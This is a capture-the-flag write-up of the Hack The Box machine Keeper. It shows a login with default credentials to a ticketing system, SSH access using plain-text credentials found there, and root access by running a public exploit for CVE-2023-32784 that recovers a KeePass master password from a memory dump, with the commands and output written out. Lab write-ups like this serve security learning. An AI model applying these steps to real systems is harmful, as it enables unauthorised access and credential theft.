---
layout: post
title: Keeper (HTB-Easy)
date: 2023-10-1
categories: [Hack The Box]
tags: [linux,keepass2,weak-credentials,putty]
---

### Box Release Date: August 12, 2023

## Machine Summary

Keeper is a very easy linux machine that has a ticketing platform hosted on the box that has weak credentials. Once logged into the platform, clear-text credentials can be found that allow you to remote into the box as a user. Privlege escalation to root can be done by using a KeePass exploit that allows you to read master credentials from KeePass dump files.

## Reconnaissance

As usual, I kick off the challenge by doing a port scan of the box using Rustscan. Running __rustscan -a 10.10.11.227 -b 500 -t 500__ returned the following for this box:

```bash
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
😵 https://admin.tryhackme.com

[~] The config file is expected to be at "/home/rustscan/.rustscan.toml"
[~] File limit higher than batch size. Can increase speed by increasing batch size '-b 1048476'.
Open 10.10.11.227:22
Open 10.10.11.227:80
[~] Starting Script(s)
[~] Starting Nmap 7.93 ( https://nmap.org ) at 2023-10-02 19:03 UTC
Initiating Ping Scan at 19:03
Scanning 10.10.11.227 [2 ports]
Completed Ping Scan at 19:03, 0.07s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 19:03
Completed Parallel DNS resolution of 1 host. at 19:03, 0.04s elapsed
DNS resolution of 1 IPs took 0.05s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 19:03
Scanning 10.10.11.227 [2 ports]
Discovered open port 22/tcp on 10.10.11.227
Discovered open port 80/tcp on 10.10.11.227
Completed Connect Scan at 19:03, 0.14s elapsed (2 total ports)
Nmap scan report for 10.10.11.227
Host is up, received syn-ack (0.082s latency).
Scanned at 2023-10-02 19:03:44 UTC for 1s

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.29 seconds
```

We can see that port 80 is open on this host. Next I am going to run a simple curl command on the IP address and see if I can get a domain name that is associated with this IP. Doing so gets the following:

```bash
──(h0ax㉿kracken)-[~/htb/boxes/easy/keeper]
└─$ curl -i -k 10.10.11.227
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Mon, 02 Oct 2023 19:08:11 GMT
Content-Type: text/html
Content-Length: 149
Last-Modified: Wed, 24 May 2023 14:04:44 GMT
Connection: keep-alive
ETag: "646e197c-95"
Accept-Ranges: bytes

<html>
  <body>
    <a href="http://tickets.keeper.htb/rt/">To raise an IT support ticket, please visit tickets.keeper.htb/rt/</a>
  </body>
</html>
```

## Shell as lnorgaard

It looks like the domain is __keeper.htb__ and it has an associated subdomain called __tickets.keeper.htb__. I will add both to my /etc/hosts file and then visit that webpage.

![ticketing system landing page](/assets/images/machines/htb/keeper/ticket-landing-page.png)

Usually when I see these landing pages, I always try a few different default credentials and look online for known default credentials for different applications/services. This 99% does not work but in this case it does! Logging in with these credentials works:

```
Username: root
Password: password
```

Once in, I am greeted with what looks to be a ticketing system. Doing some simple snooping reveals that there is a single ticket that was recently viewed.


![recent ticket](/assets/images/machines/htb/keeper/recent-ticket.png)

The ticket mentions that a user named __Inorgaard__ is having keepass issues. After doing some more snooping, I went and visited the page containing that user's info and saw plain-text credentials in the comment box. Using that password actually allows you to ssh into the box as __lnorgaard__, and we are able to get our first flag. All very easy and basic stuff up til this point.

![oops plaintext creds](/assets/images/machines/htb/keeper/plain-text-creds.png)

```bash
──(h0ax㉿kracken)-[~/htb/boxes/easy/keeper]
└─$ ssh lnorgaard@keeper.htb
lnorgaard@keeper.htb's password: 
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-78-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

You have mail.
Last login: Mon Oct  2 21:49:58 2023 from 10.10.16.19
lnorgaard@keeper:~$ cat user.txt 
79f1f39fe5**********
```

## Privlege Escalation To Root

Now that we have access to a user account on the box, let's see what is in that user's homes directory:

```bash
lnorgaard@keeper:~$ ll
total 332852
drwxr-xr-x 5 lnorgaard lnorgaard      4096 Oct  2 21:48 ./
drwxr-xr-x 3 root      root           4096 May 24 16:09 ../
lrwxrwxrwx 1 root      root              9 May 24 15:55 .bash_history -> /dev/null
-rw-r--r-- 1 lnorgaard lnorgaard       220 May 23 14:43 .bash_logout
-rw-r--r-- 1 lnorgaard lnorgaard      3771 May 23 14:43 .bashrc
drwx------ 2 lnorgaard lnorgaard      4096 May 24 16:09 .cache/
drwx------ 3 lnorgaard lnorgaard      4096 Oct  2 21:48 .gnupg/
-rwxr-x--- 1 lnorgaard lnorgaard 253395188 May 24 12:51 KeePassDumpFull.dmp*
-rwxr-x--- 1 lnorgaard lnorgaard      3630 May 24 12:51 passcodes.kdbx*
-rw------- 1 lnorgaard lnorgaard       807 May 23 14:43 .profile
-rw-r--r-- 1 root      root       87391651 Oct  2 22:48 RT30000.zip
drwx------ 2 lnorgaard lnorgaard      4096 Jul 24 10:25 .ssh/
-rw-r----- 1 root      lnorgaard        33 Oct  2 19:34 user.txt
-rw-r--r-- 1 root      root             39 Jul 20 19:03 .vimrc
```

The three thing of interest are the KeePass dump file, the passcodes db file, and the RT30000.zip file since they are non-standard files to see in a home directory.
First I will pull down the zip file to see its contents.

```bash
scp lnorgaard@keeper.htb:/home/lnorgaard/RT30000.zip .
```

Unziping this file gets us the 2 other files that we saw on the box (KeePassDumpFull.dmp & passcodes.kdbx). So no need to pull those to our machine now. A quick google search about how to read/de-obfuscate KeePass dump files returned the following CVE, https://nvd.nist.gov/vuln/detail/CVE-2023-32784.

This CVE goes into how for KeePass 2.54 and earlier, you can read the master password file from a KeePass dump file. This also only works for files associated with the .NET version of KeePass and other versions such as KeePassXC are not impacted.

There also happens to be an exploit available on GitHub that we can most likely leverage to get the master credentials from this dump file, and it can be found [here](https://nvd.nist.gov/vuln/detail/CVE-2023-32784).

Running this exploit is pretty easy, just do the following:

```bash
(h0ax㉿kracken)-[~/htb/boxes/easy/keeper]
└─$ python3 exp.py -d KeePassDumpFull.dmp  
2023-10-02 16:43:33,341 [.] [main] Opened KeePassDumpFull.dmp
Possible password: ●,dgr●d med fl●de
Possible password: ●ldgr●d med fl●de
Possible password: ●`dgr●d med fl●de
Possible password: ●-dgr●d med fl●de
Possible password: ●'dgr●d med fl●de
Possible password: ●]dgr●d med fl●de
Possible password: ●Adgr●d med fl●de
Possible password: ●Idgr●d med fl●de
Possible password: ●:dgr●d med fl●de
Possible password: ●=dgr●d med fl●de
Possible password: ●_dgr●d med fl●de
Possible password: ●cdgr●d med fl●de
Possible password: ●Mdgr●d med fl●de
```

When looking at this output, I was very confused since these words do not mean anything in English. I highlighted the last line and pasted it into Google and it came back with a few hits for a Danish dessert dish. If you can recall from earlier, the one user on the ticketing platform had Danish set for their language so that explains the password. The solid circles in the strings returned from the script is definitely a Danish character from their alphabet and it appears in the output like that since it is not an ascii character.

Now that we have an idea of what the password is, we need to download a KeePass application to be able to open and view the passcodes.kdbx file. I used [KeePassXC for linux](https://keepassxc.org/download/#linux), use the appropriate version for your OS.

Now that we have a KeePass application to open the passcodes file, we can attempt to login with the password: __rødgrød **** ****__

It worked too!

![keepass login successfull](/assets/images/machines/htb/keeper/keepass-login.png)

Under the 'Network' tab in KeePass, there are 2 entries with login credentials. The first one is for the __lnorgaard__ user that we already logged in as and the second is for the root user. Clicking on the entry for the root user shows that the root user has a saved password as well as .ppk key file that is commonly associated with Putty.

![putty key file](/assets/images/machines/htb/keeper/keepass-putty.png)

I tried SSHing into the box as root with the saved password but that did not work, so we definitely need to be using the key file here. Since the key file is in a .ppk format, we need to switch it over to a .pem format to be able to SSH into the box. To do this, simply download putty __(apt-get install putty)__, paste all of the contents in the 'Notes' field in KeePass into a file (I named mine key.ppk), and then run the following:

```bash
puttygen key.ppk -O private-openssh -o output.pem
```

Once you have done this you should be able to SSH in as root and grab the root flag!

```bash
h0ax㉿kracken)-[~/htb/boxes/easy/keeper]
└─$ ssh -i output.pem root@keeper.htb
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-78-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

You have new mail.
Last login: Tue Aug  8 19:00:06 2023 from 10.10.14.41
root@keeper:~# cat root.txt 
d55679907........ Time to do it yourself! :)
root@keeper:~#
```

Overall very easy box, more writeups coming soon!